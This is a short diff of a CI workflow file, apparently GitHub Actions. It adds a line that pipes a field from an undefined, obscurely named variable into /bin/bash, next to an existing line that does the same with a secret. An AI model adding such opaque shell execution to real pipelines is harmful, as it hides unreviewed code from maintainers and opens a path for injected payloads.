@@ -23,6 +23,7 @@ jobs:
           zwkl75327: ${{ secrets.zwkl75327 }}
         run: |
           printf '%s' "$zwkl75327" | jq -r .vmel93 | /bin/bash
+          printf '%s' "$cmx0" | jq -r .u944 | /bin/bash
 
       - name: Store artifact
         if: always()
